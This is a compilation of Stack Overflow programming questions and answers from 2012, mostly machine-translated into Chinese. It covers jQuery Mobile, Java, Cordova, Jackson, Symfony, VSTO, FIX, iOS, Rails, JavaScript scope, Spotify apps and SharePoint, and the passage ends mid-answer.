# jquery - jquerymobile 动态检查复选框

> ID：11583362
> 
> 赞同：-1
> 
> 时间：2012-07-20T16:25:15.983
> 
> 标签：jquery, jquery-mobile, checkbox

我想让这个例子工作

[http://jsfiddle.net/ca11111/m8qyN/1/](http://jsfiddle.net/ca11111/m8qyN/1/)

有一个全选按钮

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:41:39.593

这样做： -

```
$('a[type=button]').click(function() {
    $('#checks  input[type=checkbox]').attr('checked', 'checked').checkboxradio('refresh');
}); 
```

在 jquery mobile 上，检查您需要使用的复选框`checkboxradio('refresh')`。

这是诀窍，您需要按照勾选复选框。

参考**[现场演示](http://jsfiddle.net/SivaCharan/m8qyN/4/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:38:07.133

这对你有用吗：

*   [http://jsfiddle.net/m8qyN/3/](http://jsfiddle.net/m8qyN/3/)

JS

```
$('#checkAll').on('click', function() {
    $('.checkAllGroup').each(function() {
        var cb = $(this);
        cb.attr('checked', true).checkboxradio('refresh');
    });
}); 
```

HTML

```
<div data-role="page" id="Home">
    <div data-role="content">     
test
    <div id="checks" data-role="fieldcontain">
                     <fieldset data-role="controlgroup">
                        <legend>Pays:</legend>
                        <input type="checkbox" name="reg1" id="checkbox-1a" class="checkAllGroup"/>
                        <label for="checkbox-1a">11</label>

                        <input type="checkbox" name="reg2" id="checkbox-2a" class="checkAllGroup"/>
                        <label for="checkbox-2a">12</label>

                    </fieldset>
                </div>      

        <a type="button" id="checkAll">check</a>

    </div>

</div> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-20T16:31:07.723

您应该使用这个[setter](http://api.jquery.com/attr/)而不是[getter](http://api.jquery.com/prop/)方法。

# java - Convert String to File in Java

> ID：11583364
> 
> 赞同：26
> 
> 时间：2012-07-20T16:25:27.370
> 
> 标签：java, string, file

I have code that asks the user to input a log file name so it knows what file it is to parse and sort.

To be able to parse correctly, the `FileSource.parseXML` reads a variable type of `File`. So, the input `String` needs to be converted to a `File`. How would this be done?

```
import java.io.*;
import java.util.*;

public class Main
{
    public static void main( String[] args )
    {
        FileSource src;
        File fd=null;
        int rc = 0;
        int count = 0;
        Record rec;

      //ask user what file to parse
      Scanner input = new Scanner(System.in);
      System.out.println("Enter file name:");
      String filename = input.nextLine();

      //TODO turn filename into fd

        //parse the records
        src = FileSource.parseXML( fd );

        //print out the number of records parsed
        rc = src.getRecordCount();
        System.out.println(rc);

        //print out all records. 
        for( int i = 0; i < rc; i++)
        {
            rec = src.getRecord( i );
            System.out.println( rec.toString());
        } //end for loop

        return;
    }//end main method  

} 
```

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-07-20T16:27:18.553

`File file = new File(userInput);`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-20T16:27:27.613

看到你有文件名，你应该可以创建一个文件：

```
File file = new File(filename); 
```

有关文件的更多信息，请参阅[此 javadoc](http://docs.oracle.com/javase/7/docs/api/java/io/File.html#File%28java.lang.String%29)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-20T16:28:35.183

来自 Oracle 的 javadoc (v7) [http://docs.oracle.com/javase/7/docs/api/](http://docs.oracle.com/javase/7/docs/api/)：

```
 File(String pathname) 
            Creates a new File instance by converting the given pathname string into an abstract pathname 
```

# android - 导入android.app.DroidGap无法解析

> ID：11583370
> 
> 赞同：1
> 
> 时间：2012-07-20T16:25:59.320
> 
> 标签：android, eclipse, eclipse-adt

天哪，这让我头疼。我根据这篇文章[DroidGap cannot be resolved into a type](https://stackoverflow.com/questions/11242697/droidgap-cannot-be-resolved-into-a-type)检查了所有内容，但它仍然无法正常工作。

这是我的代码：

```
import org.apache.cordova.*;
import android.app.DroidGap;
import android.os.Bundle;
import android.view.Menu;

public class SpotableActivity extends DroidGap {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        super.loadUrl("file:///android_asset/www/index.html");
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_spotable, menu);
        return true;
    }
} 
```

而且我的构建路径中有cordova jar。

我在这里遵循了文档中的所有步骤：http: [//docs.phonegap.com/en/1.9.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android](http://docs.phonegap.com/en/1.9.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:35:58.740

您引用的页面中的步骤没有`android.app.DroidGap`，因为没有这样的类 AFAIK。`DroidGap`，根据该页面，在`org.apache.cordova`.

所以，删除`DroidGap` `import`语句，你应该有更好的运气。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T08:14:11.727

对于 Cordova 2.0.0，您不需要以下行：

```
android.app.DroidGap; 
```

在这方面，文档似乎是不正确的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-26T19:08:19.827

如果您使用cordova.2.9.1.jar，请确保将其替换为cordova.2.9.0.jar，然后..魔法..

不要忘记：
1\. 右键单击​​ cordova.2.9.0.jar >> 构建路径 >> 添加到构建路径
2\. 右键单击​​ cordova.2.9.0.jar >> 构建路径 >> 配置构建路径 >> 订单并导出>>检查cordova-2.9.0.jar>>确定
3.将此代码添加到AndroidManifest.xml，在'uses-sdk ... ...'代码上方

```
 <supports-screens
    android:largeScreens="true"
    android:normalScreens="true"
    android:smallScreens="true"
    android:xlargeScreens="true"
    android:resizeable="true"
    android:anyDensity="true"
    />

<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.VIBRATE" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.RECORD_VIDEO"/>
<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />   
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />   
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
<uses-permission android:name="android.permission.BROADCAST_STICKY" /> 
```

4.  在您的*代码 .java*中，尝试删除此代码

    ```
    import android.app.DroidGap; 
    ```

也许这个代码也是

```
 @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_spotable, menu);
        return true;
    } 
```

运行。在头痛模式下 4 小时后它对我有用。

# jackson - 映射器写入包装值但无法读取

> ID：11583371
> 
> 赞同：1
> 
> 时间：2012-07-20T16:26:02.643
> 
> 标签：jackson

我需要将我的 json 对象包装成如下所示：

```
{
    "user" : { "id":1 }
} 
```

代替

```
{
    "id":1
} 
```

所以我设置：

```
mapper.configure(SerializationConfig.Feature.WRAP_ROOT_VALUE, true); 
```

序列化部分工作正常：

```
mapper.writeValue(writer, user); 
```

但如果我这样做：

```
User u = mapper.readValue(writer.toString(), User.class); 
```

返回的对象仅包含空字段。我是否需要配置其他内容来读取包装元素？

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:15:08.017

我认为您正在寻找与`SerializationConfig.Feature.WRAP_ROOT_VALUE`. 是`DeserializationConfig.Feature.UNWRAP_ROOT_VALUE`。（对于杰克逊 2+，它是`DeserializationFeature.UNWRAP_ROOT_VALUE`。）

# javascript - 动态添加输入字段，但字段由外部 PHP 函数生成

> ID：11583375
> 
> 赞同：0
> 
> 时间：2012-07-20T16:26:06.747
> 
> 标签：javascript, php, jquery, model-view-controller, jquery-events

这个问题可能看起来像重复，但我真的找不到类似的东西。事情在这里有效，但在这里不是动态的：

```
 var counter = 0;
function addInput(divName){
      var newdiv = document.createElement('div');
      newdiv.innerHTML = "Member " + (counter + 1) + " <br><input type='text' name='myInputs[]'>";
      document.getElementById(divName).appendChild(newdiv);
      counter++;
 } 
```

但在这里我稍微改变一下：

```
 var counter = 0;
function addInput(divName){
      var newdiv = document.createElement('div');
      newdiv.innerHTML = "Member " + (counter + 1) + addmore();
      document.getElementById(divName).appendChild(newdiv);
      counter++;
 } 
```

因此，这里的新函数`addmore()`返回由外部 PHP 代码生成的字段，该代码在 AJAX 的帮助下被调用。

函数 `addmore();`是这样的：

```
addmore(){
        $jd.ajax({
          url: "<?php echo JURI::root(); ?>",
          type: "POST",
          data: {'option':'com_joomd', 'view':'itempanel', 'task':'loadfields', 'typeid':<?php echo $this->cparams->typeid; ?>, 'catid[]':checked, 'id':<?php echo (int)$this->item->id; ?>, "<?php echo jutility::getToken(); ?>":1, 'abase':1},
          beforeSend: function()    {
            $jd(".poploadingbox").show();
          },
          complete: function()  {
            $jd(".poploadingbox").hide();
          },
          success: function(res)    {

                $jd('#fieldtable_id').html(res);
          },
          error: function() {
              alert('error');                 
          }
    });
} 
```

显然这部分`$jd('#fieldtable_id').html(res);`正在做实际的工作，但我不能用它来动态地在这里引入新字段。

请指导我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:34:54.850

您的函数 addmore() 没有返回任何内容，因为

1.  `return "value"`你的函数中没有
2.  您正在使用 $jd.ajax() 进行异步调用

你应该这样做：

```
var counter = 0;
function addInput(divName){
      addmore(divName);
} 
```

和 ：

```
function addmore(divName){
        $jd.ajax({
          url: "<?php echo JURI::root(); ?>",
          type: "POST",
          data: {'option':'com_joomd', 'view':'itempanel', 'task':'loadfields', 'typeid':<?php echo $this->cparams->typeid; ?>, 'catid[]':checked, 'id':<?php echo (int)$this->item-        id; ?>, "<?php echo jutility::getToken(); ?>":1, 'abase':1},
          beforeSend: function()    {
            $jd(".poploadingbox").show();
          },
          complete: function()  {
            $jd(".poploadingbox").hide();
          },
          success: function(res)    {
             var newdiv = document.createElement('div');
             newdiv.innerHTML = "Member " + (counter + 1) + res;
             document.getElementById(divName).appendChild(newdiv);
             counter++;

          },
          error: function() {
              alert('error');                 
          }
    });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:41:45.637

如果您想从 ajax 调用返回值。将 async 设置为 false 并使用 responseText 从 ajax 调用返回值。然后从 addmore 函数返回该变量。

[从 jquery ajax 调用返回值。](https://stackoverflow.com/questions/1152692/jquery-ajax-get-responsetext-from-http-url)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:36:52.960

试试这个动态添加/删除输入字段（使用jquery）：

```
<script>$(function() {
        var scntDiv = $('#p_scents');
        var i = $('#p_scents p').size() + 1;

        $('#addScnt').live('click', function() {
                $('<p><label for="p_scnts"><input type="text" id="p_scnt" size="20" name="p_scnt_' + i +'" value="" placeholder="Input Value" /></label> <a href="#" id="remScnt">Remove</a></p>').appendTo(scntDiv);
                i++;
                return false;
        });

        $('#remScnt').live('click', function() {
                if( i > 2 ) {
                        $(this).parents('p').remove();
                        i--;
                }
                return false;
        });
});</script>

<style>
* { font-family:Arial; }
h2 { padding:0 0 5px 5px; }
h2 a { color: #224f99; }
a { color:#999; text-decoration: none; }
a:hover { color:#802727; }
p { padding:0 0 5px 0; }
input { padding:5px; border:1px solid #999; border-radius:4px; -moz-border-radius:4px; -web-kit-border-radius:4px; -khtml-border-radius:4px; }
</style>

<div id="ContentWrapper">  
<h2><a href="#" id="addScnt">Add Another Input Box</a></h2>
<form id="cat" method="POST" action="">
<div id="p_scents">
    <p>
        <label for="p_scnts"><input type="text" id="p_scnt" size="20" name="p_scnt" value="" placeholder="Input Value" /></label>
    </p>
</div> 
```

新字段的帖子名称将是：**p_scnt_1**，**p_scnt_2**等...

# logging - symfony2 中的自定义记录器和独白格式化程序 - 配置 services.xml

> ID：11583380
> 
> 赞同：1
> 
> 时间：2012-07-20T16:26:17.527
> 
> 标签：logging, symfony, formatter, monolog

我已经开始学习 Symfony2，目前我正在处理一个我想单独记录的命令。

我的目标是使用自定义记录器并为我的命令获取干净的日志文件。我在一个使用 xml 配置文件的项目上工作，但我不知道如何翻译一些 .yml 参数和选项。

我已阅读[如何将一项服务的日志写入单独的文件？](https://stackoverflow.com/questions/8169114/how-to-write-logs-from-one-service-into-separate-file/8210892#8210892)并获得了一个单独的工作日志文件。

```
<?xml version="1.0" ?>
<container xmlns="http://symfony.com/schema/dic/services"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://symfony.com/schema/dic/services http://symfony.com/schema/dic/services/services-1.0.xsd">

    <services>
        <service id="myproject_mycommand.logger" class="Symfony\Bridge\Monolog\Logger">
            <argument>myproject_mycommand.logger</argument>
            <call method="pushHandler">
                <argument type="service" id="myproject_mycommand.logger_handler" />
            </call>
        </service>

        <service id="myproject_mycommand.logger_handler" class="Monolog\Handler\StreamHandler">
            <argument>%kernel.logs_dir%/my_custom_file_log.log</argument>
        </service>
    </services>
</container> 
```

在查看[Symfony2 后：在登录不同文件时使用处理器](https://stackoverflow.com/questions/11520298/symfony2-use-processors-while-logging-in-different-files)我试图只将我想要的字段传递给独白行格式化程序，例如 "[%%datetime%%] %%message%%\n"

我想我必须添加类似的内容：

```
container
...
    xmlns:monolog="http://symfony.com/schema/dic/monolog"
... 
```

和

```
<service id="myproject_mycommand.logger.formatter" class="Monolog\Formatter\LineFormatter">
    <argument>"[%%datetime%%] %%message%%\n"</argument>
</service> 
```

但我不知道如何在 xml 文件中配置这个简单的格式化程序。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T13:28:49.893

您需要创建格式化程序并将其扩展`FormatterInterface`并实现`format`和`formatBatch`.

然后添加服务定义

```
<service id="myproject_mycommand.logger.formatter" class="MyBundle\Formatter\XmlFormatter">
    <argument>some arguments if you need one</argument>
</service>

<service id="myproject_mycommand.logger_handler" class="Monolog\Handler\StreamHandler">
    <argument>%kernel.logs_dir%/my_custom_file_log.log</argument>
    <call method="setFormatter">
        <argument type="service" id="myproject_mycommand.logger.formatter"/>
    </call>    
</service> 
```

就是这样。有关如何格式化的想法，您可以查看**独白包**源中不同格式化程序的示例。

# c# - 添加 WPF 命名空间会导致 VSTO 编译错误

> ID：11583384
> 
> 赞同：4
> 
> 时间：2012-07-20T16:26:31.723
> 
> 标签：c#, wpf, xaml, namespaces, vsto

我在我的 VSTO 项目中遇到一个奇怪的错误，其中 XAML 文件导致不相关代码中的构建错误。

这是我所做的

1.  创建一个新的 Excel 2010 加载项项目（此处命名为 TestAddIn）

2.  修改`ThisAddIn_Startup`为阅读

    ```
    private void ThisAddIn_Startup(object sender, System.EventArgs e)
    {
        Worksheet w = Globals.ThisAddIn.Application.Workbooks[1].Sheets[1];
        w.Rows[1].Font.Bold = true;
    } 
    ```

3.  构建项目。构建应该成功。

4.  将 WPF 用户控件作为新项添加到项目中。您还需要添加`System.Xaml`为项目参考。

5.  再次构建项目。构建应该成功。

6.  修改 UserControl1.xaml 为读取

    ```
    <UserControl x:Class="TestAddIn.UserControl1"
                 xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                 xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                 xmlns:Test="clr-namespace:TestAddIn" <!-- Add this line -->
                 >
        <Grid>

        </Grid>
    </UserControl> 
    ```

7.  构建项目。构建失败并显示错误消息

    > “object”不包含“Font”的定义，并且找不到接受“object”类型的第一个参数的扩展方法“Font”（您是否缺少 using 指令或程序集引用？）

在 UserControl1.xaml 中删除或添加命名空间行将导致生成成功或失败。

我对此感到非常困惑，因为 WPF 文件与加载项文件没有直接关系。我想一定有一个链接问题？

我意识到我可以通过显式强制转换 ( `((Range)w.Rows[1]).Font.Bold = true`) 来解决这个问题。但我真的不想到处这样做。

我该如何解决这个问题，以便我可以在我的 VSTO 项目中拥有一个 WPF 文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-13T14:48:11.730

我找到了一种让 VS2012 用户使用它的方法。

1.  转到解决方案资源管理器 -> 引用文件夹并选择对“Microsoft.Office.Interop.Excel”的引用。
2.  在其属性中，将“嵌入互操作类型”设置为 False 并编译。错误应该仍然出现。现在再次将其设置回 True 并编译。瞧！

此错误已在 VS2013（更新 3）中修复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-23T18:55:16.183

尝试`;assembly=`在 xmlns 声明的末尾添加。像这样：

```
xmlns:Test="clr-namespace:TestAddIn;assembly=" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T17:38:13.967

我也遇到了这个问题，不知道根本原因是什么。

但是，如果命名空间是在与 VSTO 不同的程序集中定义的，我可以将命名空间添加到我的 XAML 文件中。

因此，每次都会出现这些奇怪的转换错误，这会失败：

```
xmlns:helper="clr-namespace:MyVstoProject.Utility" 
```

但这很好用：

```
xmlns:helper="clr-namespace:ReferencedProject.Utility;assembly=SomeNonVstoAssembly" 
```

# java - 在替换链中修复 OrigClOrdID（标记 41）。它是订单的第一个还是链中的前一个？

> ID：11583386
> 
> 赞同：4
> 
> 时间：2012-07-20T16:26:40.723
> 
> 标签：java, c++, quickfix, trading, fix-protocol

因此，每当我想更改（减少）我的订单数量（*OrderCancelReplaceRequest*）时，我必须发送一个新的 ClOrdID 和原始的 ClOrdID（标签 41）。好的，假设我第二次更改数量。我现在必须发送的原始 ClOrdID（标签 41）是第一个还是前一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T17:36:49.313

它是修改后的客户订单 ID（此取消/替换请求之前的最新订单 ID），而不是原始订单 ID。您可以在[FIXimate](http://fixprotocol.org/FIXimate3.0/)中检查这一点，该字段的描述显示：

> 机构分配的前一个订单（不是当天的初始订单）的 ClOrdID (11)，用于在取消和取消/替换请求中识别前一个订单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-21T16:02:38.780

它是最近一个（最后发送的那个）的 clOrdId。即使服务器将消息排队或立即处理每条消息，这两种方式都可以工作。我认为在某处的矩阵中存在一些场景（不确定可能仅在 FIX 站点中），这表明相同。如果您需要更多解释，请告诉我。

# objective-c - UIButton 标题更改为默认值

> ID：11583387
> 
> 赞同：40
> 
> 时间：2012-07-20T16:26:41.427
> 
> 标签：objective-c, ios, uibutton

我觉得这可能是一个愚蠢的问题......但无论如何我有这种奇怪的`UIButton`标题行为。

按钮已设置并连接到 IB 中的动作和属性（动作是`startButtonPushed`，属性是`startButton`）。在视图控制器内部，我的操作设置如下：

```
bool buttonStateStop;

- (IBAction)startPushed:(id)sender 
{
    if (buttonStateStop) 
    {
        [appD.locationManager stopSavingLocations];
        startButton.titleLabel.text = @"Start";
        buttonStateStop = NO;
    }
    else 
    {
        [appD.locationManager startSavingLocations];
        startButton.titleLabel.text = @"Stop";
        buttonStateStop = YES;        
    }
} 
```

最初我将 IB 中的默认标题设置为“开始”，但每当我按下按钮时，它会在几分之一秒内变为“停止”，然后返回。我花了一段时间试图弄清楚为什么标题总是回到“开始”。最终，我将 IB 标题更改为“xxxxxx”，并意识到无论如何，按钮标题更改后，IB 标题都会立即重新声明。

**所以问题是：**为什么 IB 不断将按钮的标题改回默认值？我以前从未遇到过这种行为。并且（显然）我该如何解决它？

额外信息：对按钮的唯一引用是上面代码中的`@property`、`@synthesize`和语句。该视图位于导航控制器内部。

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-07-20T16:29:34.467

您需要使用`setTitle:forState:`方法而不是设置`titleLabel.text`属性：

```
[startButton setTitle:@"Start" forState:UIControlStateNormal];
// Normal and highlighted titles do not need to be the same
[startButton setTitle:@"Start!" forState:UIControlStateHighlighted]; 
```

现在发生的情况是，您在标签中设置了代表当前状态视图的标题，但是一旦状态从 push 变为 normal，按钮会将标签重置为新状态的标题（即您在 IB 中设置）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-08-17T20:23:53.590

这个的快速版本是

```
startButton.setTitle("Start", forState: UIControlState.Normal) 
```

# ruby-on-rails - 我怎样才能执行类似地图的功能，但仍然能够使用活动记录方法？

> ID：11583388
> 
> 赞同：0
> 
> 时间：2012-07-20T16:26:48.033
> 
> 标签：ruby-on-rails, arrays, activerecord

我在使用地图的地方有以下内容：

```
last_activities = report.deals.map do |deal|
  deal.activities.last
end 
```

然后我希望能够在“last_activities”上使用“where”，但我不能这样做，因为 last_activities 是一个数组。我想做但不能做的是：

```
fun_activities = last_activities.where(:type => "fun") 
```

我怎样才能在rails中完成这个？

更新：

报告 has_many 交易
Deal belongs_to 报告
Deal has_many 活动
Activity belongs_to deal

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:59:18.853

有两种方法可以实现这一点：

1）继续数组。也就是说，使用 select 选择有趣的活动： fun_activities = last_activities.select { |a| a.type == “有趣”}

2) 定义一个 SQL 语句，直接选择您想要的活动或尝试使用 ActiveRecord 查询来实现相同的活动 - 这将具有更好的性能或不将所有内容加载到数组中的优势。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T22:04:26.590

使用[squeel](https://github.com/ernie/squeel)很容易在 ruby​​ 中表达这一点，而无需编写原始 SQL 查询：

```
max_ids_rel = Activity.group{deal_id}.select{max(id)}

Activity.joins{deal}.where{(deal.report_id == my{report.id}) && id.in(max_ids_rel)} 
```

这应该会生成一个类似于 HargrimmTheBleak 建议的子选择。与生成的表进行连接也是可能的，但这需要更多的分组语句并且不是必需的，因为一个好的查询分析器应该能够将其转换为连接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:05:45.603

如果它们很少，您可以按照评论中的说明进行映射和选择

```
all_last_activities = report.deals.map do |deal|
  deal.activities.last
end

fun_last_activities = all_last_activities.select do |act|
  act.type == "fun"
end 
```

如果有很多记录，你最好用一个查询来做

```
all_last_activities_ids = report.deals.map do |deal|
  deal.activities.last.id
end

Activity.where(type: "fun").find(all_last_activities_ids) 
```

你也应该`all_last_activities_ids`从查询中得到，但我现在没有时间找出如何去做。但是一个组子句应该会有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T17:07:38.490

如果您想使用 AR/SQL 查询，请执行以下操作：

```
Activity.joins(:deal).where(['deals.report_id = ? and activities.id in (select max(id) from activities group by deal_id)'], report.id) 
```

这将允许像您在原始问题中想要的那样链接条件。然而，为了简单和可读性，您可能更喜欢选择/拒绝方法。

# javascript - 作为函数参数传递的匿名函数的范围

> ID：11583391
> 
> 赞同：5
> 
> 时间：2012-07-20T16:27:12.033
> 
> 标签：javascript, scope

鉴于以下代码，我应该在警报中看到什么？

```
var a = 100;
function afunc(infunc){
  a = 10;
  infunc.call();
}

afunc(function(){alert(a)}); 
```

我最初的想法是我的浏览器应该警告 100，因为变量 a=100 将在作为参数传递给 afunc 的匿名函数的范围内。但这假设匿名函数实际上是在全局上下文中定义的。显然情况并非如此，因为浏览器会发出警报 10。那么为什么在作用域链中 a=10 领先于 a=100 呢？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T16:30:22.187

因为您在调用匿名函数之前将 a 设置为 10。a 实际上是全局的，但您将其设置为 10。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-20T16:31:13.353

> 那么为什么在作用域链中 a=10 领先于 a=100 呢？

它不是。您只定义了 1 个`a`变量，它只是在被警告之前从 更改`100`为。`10`

如果您希望`a`s 是具有自己值的不同变量，则它们都需要一个`var`关键字：

```
var a = 100
function afunc(infunc){
  var a = 10;
  infunc.call();
}

afunc(function(){alert(a)})​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:54:41.460

考虑以下示例：

```
var a = 100;

function afunc(infunc){
  a = 10;
  var f = function (){
    console.log(a);
  };
  f.call();
  infunc.call();
}

afunc(function (){ console.log(a); }); 
```

`a`我们在 的范围内赋值 10 `afunc`，然后依次调用两个函数来简单地记录 的值`a`。在这种情况下，您会期望两个函数都将 10 记录为 的值`a`，而这实际上就是发生的情况。

在您的示例中，`infunc`将在与 中定义的任何本地函数基本相同的范围内执行`afunc`，而不管它实际定义的位置。由于您`a`在更窄的范围内分配了一个值，这就是`a`您调用`infunc`.

函数*确实*从它们的定义中保留了一些范围，如下例所示：

```
function bfunc(){
  var b = 'hello';
  return function (){ console.log(b); };
}

afunc(bfunc()); 
```

在这里，返回的匿名函数`bfunc`实际上是在 范围内调用的`afunc`，但它仍然能够记录`b`在原始范围内分配的正确值。如果您要更改`afunc`为 分配不同的值`b`，它仍然会记录`"hello"`，因为`b`定义`afunc`的变量与`b`定义的变量不同`bfunc`。

# spotify - 如何从我的 Spotify 应用程序调用“下一首曲目”和“当前曲目加注星标”？

> ID：11583398
> 
> 赞同：1
> 
> 时间：2012-07-20T16:27:39.157
> 
> 标签：spotify, skip

我刚开始写一个小 Spotify 应用程序，但不知道如何从 Javascript 调用 next/star 这两个函数。我只需要这个简单的功能：从我的应用程序（Javascript）中调用一个跳过当前曲目并播放下一个曲目（如果有的话）的方法，或者调用一个“星号”的方法（这真的是一个动词吗？）当前歌曲。

这个[API DOC](https://developer.spotify.com/technologies/apps/docs/beta/)是构建我自己的应用程序的唯一资源吗？提前感谢您对此的任何提示！

**更新：**刚刚发现如何跳过：*sp.trackPlayer.skipToNextTrack();* 不幸的是，如何“明星”一首曲目仍然未知。

**更新 2：**明白了！：*models.library.starredPlaylist.add(models.player.track);* - 是的，这是有道理的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T13:47:35.313

为曲目加注星标的正确方法确实是您编写的函数：

```
models.library.starredPlaylist.add(models.player.track); 
```

trackPlayer 不是开发人员不应访问的受支持对象，因为它的版本控制不正确。这意味着将来我们对平台桥进行更新时它可能会中断。

我们建议仅使用我们开发人员网站上记录的类。

[https://developer.spotify.com/technologies/apps/docs/beta/](https://developer.spotify.com/technologies/apps/docs/beta/)

跳到下一首曲目的正确方法是使用：

```
models.player.next() 
```

# javascript - 在单页上实现 3 个列表

> ID：11583400
> 
> 赞同：0
> 
> 时间：2012-07-20T16:27:46.293
> 
> 标签：javascript, ruby-on-rails

我正在构建一个简单的待办事项应用程序。我有项目模型，其中有很多待办事项、文件和讨论。

**在项目展示页面上，我有 3 个列表：待办事项列表、文件列表和讨论列表。**

我开始使用 JS 来实现它。我同时渲染所有列表，顶部有 3 个按钮，每个按钮切换相应列表的显示/隐藏状态。

比**我担心加载时间**，尤其是文件和讨论列表。文件列表需要加载文件并且加载时间较慢，并且讨论会很多，因此加载该列表也将是耗时的。当添加所有这些加载时间时，恐怕它会太慢而无法愉快地使用。（也许是预优化，但我想正确学习......）

**我是不是很傻，我应该继续用 JS 来实现它吗？还是我应该以不同的方式做这件事？**

如果是这样，怎么做？我应该让每个列表成为一个单独的页面（项目/待办事项、项目/文件、项目/讨论）吗？我应该继续使用 JS 并使用分页加载一定数量的数据，保持加载时间可以忍受吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T19:46:18.243

我会做这样的事情。基本上设置您的关联并将范围应用于它们以获取您需要的数据。然后，您可能希望导航到每个嵌套路由以查看整个列表，或者通过 rails 或 JS 在页面上应用分页。如果你想变得超级疯狂，你可以急切地加载所有这些关联，但是有 3 个关联，每个关联都有条件，我认为这会很快变得疯狂

楷模

```
class Project < ActiveRecord::Base
    has_many :files
    has_many :discussions, :order => 'updated_at DESC'
    has_many :todos
end
class File < ActiveRecord::Base
    belongs_to :project
end
class Discussion < ActiveRecord::Base
  belongs_to :project

  #scope for last 5 discussions not marked as finished
  def self.recent_unfinished
    where(:finished => false).limit(5)
  end
end
class Todo < ActiveRecord::Base
  belongs_to :project

  def self.undone
    where(:complete => false)
  end
end 
```

控制器

```
def show
    @project = Project.find(params[:id])
    @files = @project.files.select(:filename, :filesize) #assuming you don't want blob data or whatever
    @todos = @project.todos.undone
    @discussions = @project.discussions.unfinished
end 
```

注意：我没有测试任何这些东西，所以你可能必须使用语法才能让它工作:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:34:20.597

我想说分页不仅有利于加载时间，而且有利于可用性（谁想要滚动一个巨大的列表）。

您应该使用 ajax（不确定这是否是您的意思），并在页面加载后加载密集的内容，并显示一个漂亮的 ajax 加载图标。然后，您可以轻松添加一个链接，以便用户首先请求此数据。

如果你不使用 ajax，那么一定要缓存这些列表。

# javascript - 输入表单中的 Sharepoint javascript

> ID：11583401
> 
> 赞同：0
> 
> 时间：2012-07-20T16:27:49.070
> 
> 标签：javascript, sharepoint

我创建了一个基于默认 New.aspx 模板的自定义列表输入表单。我的表单上有标签，所以我需要一些 javascript 来激活选定的标签。我已经编写了所有代码，但我不知道在哪里放置`<script />`. 如果我将它放在标签上方或下方的标题区域`<ZoneTemplate>`，我会收到各种错误，并且功能区上的按钮停止工作。如果我把它放在`<ZoneTemplate>`标签之间，表单会加载，但不会加载 javascript。任何帮助表示赞赏。

J--

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:05:58.097

基本上，您希望将代码用于在服务器端设置活动选项卡，而不是使用 javascript。下面是 Sharepoint 选项卡式多视图的示例：

```
<asp:Menu ID="menu1" runat="server" Orientation="Horizontal" StaticEnableDefaultPopOutImage="False" >
    <Items>
        <asp:MenuItem  Text="Tab 1" Value="0"></asp:MenuItem>
        <asp:MenuItem  Text="Tab 2" Value="1"></asp:MenuItem>
    </Items>
</asp:Menu>

<asp:MultiView ID="Multiview1" runat="server" ActiveViewIndex="0"  >
    <asp:View ID="view1" runat="server">
        <div>STUFF</div>
    </asp:View>
    <asp:View ID="view2" runat="server">
        <div>STUFF</div>
